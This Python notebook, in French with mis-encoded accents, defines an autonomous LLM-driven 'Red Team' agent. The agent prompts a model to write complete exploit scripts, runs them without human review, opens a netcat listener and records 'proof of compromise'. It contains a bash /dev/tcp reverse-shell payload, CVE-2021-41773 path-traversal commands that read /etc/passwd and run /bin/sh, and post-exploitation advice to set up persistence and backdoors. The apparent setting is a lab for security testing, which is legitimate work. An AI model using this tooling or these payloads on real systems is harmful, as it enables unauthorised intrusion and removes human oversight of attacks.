# Notebook 07: Agent Red Team - G√©n√©rateur d'Exploits
# Filename: notebook_07_agent_red_team.ipynb

# %% [markdown]
"""
# Agent Red Team - G√©n√©rateur d'Exploits Autonome

## Capacit√©s Avanc√©es :
- ‚úÖ G√©n√©ration de scripts d'exploitation complets (.py, .sh, .ps1)
- ‚úÖ Raisonnement strat√©gique bas√© sur les rapports d'analyse
- ‚úÖ Consultation de la base ATOMIC RED TEAM pour techniques avanc√©es
- ‚úÖ Objectif: Obtenir un reverse shell ou √©quivalent
- ‚úÖ Ex√©cution autonome des exploits g√©n√©r√©s
- ‚úÖ Rapport d√©taill√© avec preuves de compromission

## Workflow :
1. **Input** : analysis_report.json du VulnerabilityAnalyzer
2. **Raisonnement Strat√©gique** : Analyse du type d'attaque et am√©lioration possible
3. **Consultation RAG** : Recherche de techniques avanc√©es dans ATOMIC RED TEAM
4. **G√©n√©ration de Script** : Cr√©ation d'un exploit complet et autonome
5. **Ex√©cution** : Lancement de l'exploit avec gestion des listeners
6. **Output** : exploitation_report.json avec code source et preuves
"""

# %%
import os
import json
import subprocess
import sys
import requests
import time
import threading
import tempfile
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path
import socket
import shlex

# Imports LangChain et Pydantic
from pydantic import BaseModel, Field, validator
from langchain.llms import Ollama
from langchain.embeddings import OllamaEmbeddings
from langchain.vectorstores import Chroma
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from langchain.output_parsers import PydanticOutputParser

print("üî¥ Initialisation de l'Agent Red Team...")

# %%
# Mod√®les Pydantic pour l'Agent Red Team
class ExploitScript(BaseModel):
    """Mod√®le pour un script d'exploitation g√©n√©r√©"""
    
    script_name: str = Field(
        description="Nom du fichier de script (ex: 'struts2_rce_exploit.py')"
    )
    
    script_language: str = Field(
        description="Langage du script (python, bash, powershell)"
    )
    
    script_content: str = Field(
        description="Code source complet du script d'exploitation"
    )
    
    target_payload: str = Field(
        description="Payload principal utilis√© dans l'exploit"
    )
    
    reverse_shell_config: Dict[str, Any] = Field(
        description="Configuration pour le reverse shell (IP, port, type)",
        default_factory=dict
    )
    
    dependencies: List[str] = Field(
        description="D√©pendances requises pour ex√©cuter le script",
        default_factory=list
    )
    
    usage_instructions: str = Field(
        description="Instructions d'utilisation du script"
    )
    
    @validator('script_content')
    def validate_script_content(cls, v):
        if len(v.strip()) < 50:
            raise ValueError("Le script doit contenir du code substantiel")
        return v

class ExploitationReport(BaseModel):
    """Mod√®le pour le rapport d'exploitation final"""
    
    exploit_strategy: str = Field(
        description="Strat√©gie d'exploitation choisie par l'agent"
    )
    
    generated_script: ExploitScript = Field(
        description="Script d'exploitation g√©n√©r√©"
    )
    
    execution_results: Dict[str, Any] = Field(
        description="R√©sultats de l'ex√©cution de l'exploit"
    )
    
    compromise_evidence: List[str] = Field(
        description="Preuves de compromission obtenues",
        default_factory=list
    )
    
    post_exploitation_suggestions: List[str] = Field(
        description="Suggestions pour les √©tapes post-exploitation",
        default_factory=list
    )
    
    success_level: str = Field(
        description="Niveau de succ√®s de l'exploitation (FULL, PARTIAL, FAILED)"
    )
    
    @validator('success_level')
    def validate_success_level(cls, v):
        allowed = ["FULL", "PARTIAL", "FAILED"]
        if v not in allowed:
            raise ValueError(f"success_level doit √™tre dans {allowed}")
        return v

print("‚úÖ Mod√®les Pydantic pour Red Team d√©finis")

# %%
# Gestionnaire de Reverse Shell
class ReverseShellManager:
    """Gestionnaire pour les reverse shells et listeners"""
    
    def __init__(self):
        self.listener_process = None
        self.listener_port = None
        self.attacker_ip = self._get_local_ip()
    
    def _get_local_ip(self) -> str:
        """Obtient l'IP locale de l'attaquant"""
        try:
            # Connexion √† un serveur distant pour d√©terminer l'IP locale
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"
    
    def start_listener(self, port: int = None) -> Dict[str, Any]:
        """D√©marre un listener netcat pour reverse shell"""
        if port is None:
            port = self._find_free_port()
        
        self.listener_port = port
        
        try:
            # Commande netcat avec timeout
            cmd = f"nc -lvp {port}"
            
            print(f"üéß D√©marrage du listener sur {self.attacker_ip}:{port}")
            
            # D√©marrage en arri√®re-plan avec timeout
            self.listener_process = subprocess.Popen(
                shlex.split(cmd),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(1)  # Laisser le temps au listener de se lancer
            
            return {
                "status": "started",
                "ip": self.attacker_ip,
                "port": port,
                "pid": self.listener_process.pid
            }
            
        except Exception as e:
            print(f"‚ùå Erreur d√©marrage listener: {e}")
            return {"status": "error", "error": str(e)}
    
    def _find_free_port(self) -> int:
        """Trouve un port libre pour le listener"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]
    
    def stop_listener(self):
        """Arr√™te le listener"""
        if self.listener_process:
            try:
                self.listener_process.terminate()
                self.listener_process.wait(timeout=5)
                print("üîá Listener arr√™t√©")
            except:
                self.listener_process.kill()
                print("üîá Listener forc√© √† s'arr√™ter")
    
    def check_connection(self, timeout: int = 30) -> Dict[str, Any]:
        """V√©rifie si une connexion reverse shell a √©t√© √©tablie"""
        if not self.listener_process:
            return {"connected": False, "reason": "Pas de listener actif"}
        
        try:
            # Attendre une connexion avec timeout
            stdout, stderr = self.listener_process.communicate(timeout=timeout)
            
            if stdout and ("connect" in stdout.lower() or "connection" in stdout.lower()):
                return {
                    "connected": True,
                    "output": stdout[:500],
                    "connection_time": datetime.now().isoformat()
                }
            else:
                return {
                    "connected": False,
                    "reason": "Pas de connexion d√©tect√©e",
                    "output": stdout[:200] if stdout else "Pas de sortie"
                }
                
        except subprocess.TimeoutExpired:
            return {
                "connected": False,
                "reason": f"Timeout apr√®s {timeout} secondes",
                "still_listening": True
            }
        except Exception as e:
            return {
                "connected": False,
                "reason": f"Erreur v√©rification: {e}"
            }

print("‚úÖ Gestionnaire de Reverse Shell d√©fini")

# %%
# Agent Red Team Principal
class RedTeamAgent:
    """
    Agent Red Team autonome capable de g√©n√©rer et ex√©cuter des exploits
    """
    
    def __init__(self, model_name: str = "llama2:7b", enhanced_db_path: str = "./enhanced_vple_chroma_db"):
        print("üî¥ Initialisation de RedTeamAgent...")
        
        # Initialisation LLM
        self.llm = Ollama(model=model_name, temperature=0.3)
        self.embeddings = OllamaEmbeddings(model=model_name)
        
        # Connexion √† la base ENHANCED (ATOMIC RED TEAM)
        try:
            self.vectorstore = Chroma(
                persist_directory=enhanced_db_path,
                embedding_function=self.embeddings
            )
            self.retriever = self.vectorstore.as_retriever(search_kwargs={"k": 5})
            print(f"  ‚úÖ Connect√© √† la base ATOMIC RED TEAM: {enhanced_db_path}")
        except Exception as e:
            print(f"  ‚ö† Erreur connexion base enhanced: {e}")
            self.vectorstore = None
            self.retriever = None
        
        # Gestionnaire de reverse shell
        self.shell_manager = ReverseShellManager()
        
        # Parsers Pydantic
        self.script_parser = PydanticOutputParser(pydantic_object=ExploitScript)
        self.report_parser = PydanticOutputParser(pydantic_object=ExploitationReport)
        
        # Configuration des prompts
        self._setup_prompts()
        
        print("  ‚úÖ RedTeamAgent initialis√©")

    def _setup_prompts(self):
        """Configuration des prompts pour g√©n√©ration d'exploits"""
        
        # Prompt de raisonnement strat√©gique
        strategy_template = """Tu es un expert Red Team avec 15 ans d'exp√©rience en exploitation de vuln√©rabilit√©s.

ANALYSE DU RAPPORT DE VULN√âRABILIT√â:
{analysis_report}

TECHNIQUES ATOMIC RED TEAM DISPONIBLES:
{atomic_techniques}

MISSION: D√©velopper une strat√©gie d'exploitation avanc√©e pour obtenir un REVERSE SHELL.

RAISONNEMENT STRAT√âGIQUE REQUIS:
1. Analyse du type de vuln√©rabilit√© et de sa gravit√©
2. Identification des techniques d'am√©lioration possibles
3. S√©lection de la meilleure approche pour un reverse shell
4. Justification de la strat√©gie choisie

Exemple de raisonnement: "La vuln√©rabilit√© Apache Path Traversal permet la lecture de fichiers. 
En combinant avec une technique RCE via log poisoning (ATOMIC T1190.003), 
je peux injecter du code PHP dans les logs et l'ex√©cuter via Path Traversal pour obtenir un reverse shell."

STRAT√âGIE D'EXPLOITATION (200-300 mots):"""

        self.strategy_prompt = PromptTemplate(
            template=strategy_template,
            input_variables=["analysis_report", "atomic_techniques"]
        )
        
        # Prompt de g√©n√©ration de script
        script_template = """Tu es un d√©veloppeur d'exploits expert. G√©n√®re un script complet et fonctionnel.

STRAT√âGIE D'EXPLOITATION:
{exploitation_strategy}

INFORMATIONS CIBLE:
{target_info}

CONFIGURATION REVERSE SHELL:
- IP Attaquant: {attacker_ip}
- Port Listener: {listener_port}

{format_instructions}

CONTRAINTES IMPORTANTES:
1. Le script DOIT √™tre complet et ex√©cutable
2. Inclure la gestion d'erreurs robuste
3. Utiliser des biblioth√®ques standard (requests, socket, etc.)
4. Le payload reverse shell doit √™tre adapt√© √† la cible
5. Ajouter des commentaires explicatifs

SCRIPT D'EXPLOITATION:"""

        self.script_prompt = PromptTemplate(
            template=script_template,
            input_variables=["exploitation_strategy", "target_info", "attacker_ip", "listener_port"],
            partial_variables={"format_instructions": self.script_parser.get_format_instructions()}
        )
        
        # Cha√Ænes LangChain
        self.strategy_chain = LLMChain(llm=self.llm, prompt=self.strategy_prompt)
        self.script_chain = LLMChain(llm=self.llm, prompt=self.script_prompt)

    def analyze_vulnerability_report(self, analysis_report: Dict[str, Any]) -> str:
        """Analyse le rapport de vuln√©rabilit√© et consulte ATOMIC RED TEAM"""
        print("üß† Analyse du rapport de vuln√©rabilit√©...")
        
        # Extraction des informations cl√©s
        vuln_details = analysis_report.get('vulnerability_details', {})
        attack_type = vuln_details.get('attack_type', 'Unknown')
        cve = vuln_details.get('cve', 'No CVE')
        
        print(f"  üìä Type d'attaque: {attack_type}")
        print(f"  üîç CVE: {cve}")
        
        # Consultation de la base ATOMIC RED TEAM
        atomic_techniques = ""
        if self.retriever:
            try:
                # Recherche de techniques relatives
                search_query = f"{attack_type} reverse shell atomic red team"
                docs = self.retriever.get_relevant_documents(search_query)
                
                if docs:
                    atomic_techniques = "\n".join([doc.page_content[:300] for doc in docs[:3]])
                    print(f"  ‚ö° {len(docs)} techniques ATOMIC trouv√©es")
                else:
                    atomic_techniques = "Aucune technique ATOMIC sp√©cifique trouv√©e"
            except Exception as e:
                print(f"  ‚ö† Erreur consultation ATOMIC: {e}")
                atomic_techniques = "Erreur d'acc√®s √† la base ATOMIC"
        
        # G√©n√©ration de la strat√©gie
        try:
            strategy = self.strategy_chain.run(
                analysis_report=json.dumps(analysis_report, indent=2),
                atomic_techniques=atomic_techniques
            )
            print("  ‚úÖ Strat√©gie d'exploitation g√©n√©r√©e")
            return strategy
        except Exception as e:
            print(f"  ‚ùå Erreur g√©n√©ration strat√©gie: {e}")
            return f"Exploitation basique de {attack_type} pour obtenir un reverse shell"

    def generate_exploit_script(self, strategy: str, target_info: Dict[str, Any]) -> ExploitScript:
        """G√©n√®re un script d'exploitation complet"""
        print("‚öíÔ∏è G√©n√©ration du script d'exploitation...")
        
        # Configuration du reverse shell
        listener_config = self.shell_manager.start_listener()
        
        if listener_config['status'] != 'started':
            print("‚ö† Listener non d√©marr√©, utilisation de configuration par d√©faut")
            attacker_ip = "192.168.1.100"
            listener_port = 4444
        else:
            attacker_ip = listener_config['ip']
            listener_port = listener_config['port']
        
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                # G√©n√©ration avec le LLM
                raw_script = self.script_chain.run(
                    exploitation_strategy=strategy,
                    target_info=json.dumps(target_info, indent=2),
                    attacker_ip=attacker_ip,
                    listener_port=listener_port
                )
                
                # Parsing avec Pydantic
                exploit_script = self.script_parser.parse(raw_script)
                
                print(f"  ‚úÖ Script g√©n√©r√©: {exploit_script.script_name}")
                print(f"  üîß Langage: {exploit_script.script_language}")
                print(f"  üì¶ D√©pendances: {len(exploit_script.dependencies)}")
                
                return exploit_script
                
            except Exception as e:
                print(f"  ‚ö† Tentative {attempt + 1} √©chou√©e: {e}")
                if attempt == max_attempts - 1:
                    # Script de fallback
                    return self._create_fallback_script(target_info, attacker_ip, listener_port)
                time.sleep(1)

    def _create_fallback_script(self, target_info: Dict, attacker_ip: str, listener_port: int) -> ExploitScript:
        """Cr√©e un script de fallback en cas d'√©chec de g√©n√©ration"""
        print("  üîÑ Cr√©ation d'un script de fallback...")
        
        fallback_script = f"""#!/usr/bin/env python3
# Script d'exploitation de fallback g√©n√©r√© par RedTeamAgent
# Cible: {target_info.get('target_address', 'Unknown')}
# Type: Exploitation Web Basique

import requests
import socket
import subprocess
import time

def main():
    # Configuration
    target_url = "{target_info.get('target_address', 'http://localhost:8080')}"
    attacker_ip = "{attacker_ip}"
    attacker_port = {listener_port}
    
    print(f"[+] Exploitation de {{target_url}}")
    print(f"[+] Reverse shell vers {{attacker_ip}}:{{attacker_port}}")
    
    # Payload basique
    payload = "bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1'"
    
    try:
        # Test de connexion
        response = requests.get(target_url, timeout=5)
        print(f"[+] Cible accessible: {{response.status_code}}")
        
        # Tentative d'exploitation (placeholder)
        exploit_data = {{'cmd': payload}}
        exploit_response = requests.post(f"{{target_url}}/exploit", data=exploit_data, timeout=10)
        
        print(f"[+] Exploitation tent√©e: {{exploit_response.status_code}}")
        
    except Exception as e:
        print(f"[-] Erreur d'exploitation: {{e}}")

if __name__ == "__main__":
    main()
"""
        
        return ExploitScript(
            script_name="fallback_exploit.py",
            script_language="python",
            script_content=fallback_script,
            target_payload=f"bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1",
            reverse_shell_config={"ip": attacker_ip, "port": listener_port},
            dependencies=["requests"],
            usage_instructions="python3 fallback_exploit.py"
        )

    def execute_exploit(self, exploit_script: ExploitScript) -> Dict[str, Any]:
        """Ex√©cute le script d'exploitation g√©n√©r√©"""
        print("üöÄ Ex√©cution du script d'exploitation...")
        
        # Sauvegarde du script dans un fichier temporaire
        script_file = Path(f"generated_exploits/{exploit_script.script_name}")
        script_file.parent.mkdir(exist_ok=True)
        
        try:
            with open(script_file, 'w') as f:
                f.write(exploit_script.script_content)
            
            print(f"  üíæ Script sauvegard√©: {script_file}")
            
            # Rendre ex√©cutable si n√©cessaire
            if exploit_script.script_language in ['bash', 'sh']:
                os.chmod(script_file, 0o755)
            
            # Ex√©cution du script
            start_time = time.time()
            
            if exploit_script.script_language == 'python':
                cmd = f"python3 {script_file}"
            elif exploit_script.script_language in ['bash', 'sh']:
                cmd = f"bash {script_file}"
            else:
                cmd = str(script_file)
            
            print(f"  ‚ö° Ex√©cution: {cmd}")
            
            # Ex√©cution avec timeout
            process = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=30  # Timeout de 30 secondes
            )
            
            execution_time = time.time() - start_time
            
            # V√©rification des r√©sultats
            execution_results = {
                "return_code": process.returncode,
                "stdout": process.stdout,
                "stderr": process.stderr,
                "execution_time": execution_time,
                "script_executed": True
            }
            
            # V√©rification du reverse shell
            if self.shell_manager.listener_process:
                print("  üéß V√©rification de la connexion reverse shell...")
                shell_status = self.shell_manager.check_connection(timeout=10)
                execution_results["reverse_shell"] = shell_status
            
            if process.returncode == 0:
                print("  ‚úÖ Script ex√©cut√© avec succ√®s")
            else:
                print(f"  ‚ö† Script termin√© avec code: {process.returncode}")
            
            return execution_results
            
        except subprocess.TimeoutExpired:
            print("  ‚è∞ Timeout d'ex√©cution")
            return {
                "return_code": -1,
                "error": "Timeout d'ex√©cution",
                "execution_time": 30.0,
                "script_executed": False
            }
        except Exception as e:
            print(f"  ‚ùå Erreur d'ex√©cution: {e}")
            return {
                "return_code": -1,
                "error": str(e),
                "script_executed": False
            }

    def generate_exploitation_report(self, strategy: str, exploit_script: ExploitScript, 
                                   execution_results: Dict[str, Any]) -> ExploitationReport:
        """G√©n√®re le rapport final d'exploitation"""
        print("üìã G√©n√©ration du rapport d'exploitation...")
        
        # Analyse des r√©sultats pour d√©terminer le succ√®s
        success_level = "FAILED"
        compromise_evidence = []
        
        if execution_results.get("script_executed", False):
            if execution_results.get("return_code") == 0:
                success_level = "PARTIAL"
                compromise_evidence.append("Script ex√©cut√© sans erreur")
            
            # V√©rification du reverse shell
            if execution_results.get("reverse_shell", {}).get("connected", False):
                success_level = "FULL"
                compromise_evidence.append("Reverse shell √©tabli avec succ√®s")
                compromise_evidence.append(f"Connexion: {execution_results['reverse_shell'].get('connection_time')}")
            
            # Analyse de la sortie pour d'autres preuves
            stdout = execution_results.get("stdout", "")
            if any(indicator in stdout.lower() for indicator in ["uid=", "shell", "connection", "success"]):
                compromise_evidence.append("Indicateurs de compromission dans la sortie")
        
        # Suggestions post-exploitation
        post_exploit_suggestions = []
        if success_level == "FULL":
            post_exploit_suggestions = [
                "√âlever les privil√®ges (sudo -l, /etc/passwd)",
                "√âtablir la persistance (crontab, services)",
                "√ânum√©rer le r√©seau interne",
                "Rechercher des donn√©es sensibles",
                "Installer des backdoors"
            ]
        elif success_level == "PARTIAL":
            post_exploit_suggestions = [
                "Analyser les erreurs d'ex√©cution",
                "Modifier le payload pour contourner les protections",
                "Tenter des techniques d'√©vasion",
                "Essayer d'autres vecteurs d'attaque"
            ]
        else:
            post_exploit_suggestions = [
                "Revoir la strat√©gie d'exploitation",
                "Analyser la configuration de la cible",
                "Tester avec des payloads alternatifs",
                "V√©rifier la connectivit√© r√©seau"
            ]
        
        return ExploitationReport(
            exploit_strategy=strategy[:500],  # Limite de taille
            generated_script=exploit_script,
            execution_results=execution_results,
            compromise_evidence=compromise_evidence,
            post_exploitation_suggestions=post_exploit_suggestions,
            success_level=success_level
        )

    def run(self, analysis_report_path: str, target_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """M√©thode principale de l'agent Red Team"""
        print(f"\n{'üî¥'*20}")
        print(f"üî¥ D√âMARRAGE DE L'AGENT RED TEAM")
        print(f"{'üî¥'*20}")
        
        start_time = time.time()
        
        try:
            # Chargement du rapport d'analyse
            print("\nüìñ [1/5] Chargement du rapport d'analyse...")
            with open(analysis_report_path, 'r') as f:
                analysis_report = json.load(f)
            
            # Extraction des informations cible
            if target_info is None:
                target_info = {
                    "target_address": analysis_report.get('metadata', {}).get('target_address', 'Unknown'),
                    "vulhub_id": analysis_report.get('metadata', {}).get('vulhub_id', 'Unknown')
                }
            
            # Analyse et strat√©gie
            print("\nüß† [2/5] D√©veloppement de la strat√©gie d'exploitation...")
            strategy = self.analyze_vulnerability_report(analysis_report)
            
            # G√©n√©ration du script
            print("\n‚öíÔ∏è [3/5] G√©n√©ration du script d'exploitation...")
            exploit_script = self.generate_exploit_script(strategy, target_info)
            
            # Ex√©cution de l'exploit
            print("\nüöÄ [4/5] Ex√©cution de l'exploit...")
            execution_results = self.execute_exploit(exploit_script)
            
            # G√©n√©ration du rapport final
            print("\nüìã [5/5] G√©n√©ration du rapport d'exploitation...")
            exploitation_report = self.generate_exploitation_report(
                strategy, exploit_script, execution_results
            )
            
            # Nettoyage
            self.shell_manager.stop_listener()
            
            # Compilation du r√©sultat
            total_time = time.time() - start_time
            
            complete_result = {
                "metadata": {
                    "agent": "RedTeamAgent",
                    "version": "2.0",
                    "timestamp": datetime.now().isoformat(),
                    "execution_time": total_time,
                    "target_info": target_info
                },
                "exploitation_report": exploitation_report.dict(),
                "status": "SUCCESS"
            }
            
            # Sauvegarde du rapport
            report_file = "exploitation_report.json"
            with open(report_file, 'w') as f:
                json.dump(complete_result, f, indent=2)
            
            print(f"\n‚úÖ EXPLOITATION TERMIN√âE")
            print(f"‚è±Ô∏è Temps total: {total_time:.2f} secondes")
            print(f"üéØ Niveau de succ√®s: {exploitation_report.success_level}")
            print(f"üíæ Rapport sauvegard√©: {report_file}")
            
            return complete_result
            
        except Exception as e:
            self.shell_manager.stop_listener()
            print(f"\n‚ùå ERREUR DANS L'EXPLOITATION: {e}")
            return {
                "metadata": {
                    "agent": "RedTeamAgent",
                    "timestamp": datetime.now().isoformat()
                },
                "status": "ERROR",
                "error": str(e)
            }

print("‚úÖ RedTeamAgent complet d√©fini")

# %%
# D√©monstration et test de l'agent Red Team
if __name__ == "__main__":
    print(f"\nüß™ D√âMONSTRATION DE L'AGENT RED TEAM")
    print("="*50)
    
    # Chargement de la configuration
    try:
        with open("vple_config.json", "r") as f:
            config = json.load(f)
        model_name = config.get("confirmed_model", "llama2:7b")
        enhanced_db_path = config.get("enhanced_rag_setup", {}).get("vector_db", "./enhanced_vple_chroma_db")
    except:
        model_name = "llama2:7b"
        enhanced_db_path = "./enhanced_vple_chroma_db"
    
    # Initialisation de l'agent
    red_team_agent = RedTeamAgent(model_name=model_name, enhanced_db_path=enhanced_db_path)
    
    # Cr√©ation d'un rapport d'analyse fictif pour test
    fake_analysis_report = {
        "metadata": {
            "vulhub_id": "apache/CVE-2021-41773",
            "target_address": "192.168.1.100:8080"
        },
        "analysis_report": {
            "vulnerability_details": {
                "cve": "CVE-2021-41773",
                "attack_type": "Path Traversal to RCE",
                "target_service": "Apache HTTP Server"
            },
            "exploitation_plan": {
                "primary_technique": "Path Traversal combined with Log Poisoning",
                "commands_to_execute": [
                    "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'",
                    "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/bin/sh' -d 'echo=id'"
                ]
            }
        }
    }
    
    # Sauvegarde du rapport fictif
    with open("analysis_report.json", "w") as f:
        json.dump(fake_analysis_report, f, indent=2)
    
    print("üìù Rapport d'analyse fictif cr√©√© pour la d√©monstration")
    
    # Test de l'agent
    print("\nüî¥ Lancement de l'agent Red Team...")
    result = red_team_agent.run("analysis_report.json")
    
    if result['status'] == 'SUCCESS':
        exploit_report = result['exploitation_report']
        print(f"\n‚úÖ Test r√©ussi!")
        print(f"   Strat√©gie: {exploit_report['exploit_strategy'][:100]}...")
        print(f"   Script g√©n√©r√©: {exploit_report['generated_script']['script_name']}")
        print(f"   Succ√®s: {exploit_report['success_level']}")
        print(f"   Preuves: {len(exploit_report['compromise_evidence'])} √©l√©ments")
    else:
        print(f"\n‚ùå Test √©chou√©: {result.get('error', 'Erreur inconnue')}")
    
    print(f"\nüéâ D√âMONSTRATION TERMIN√âE")
    print("L'agent Red Team est pr√™t pour l'orchestrateur!")
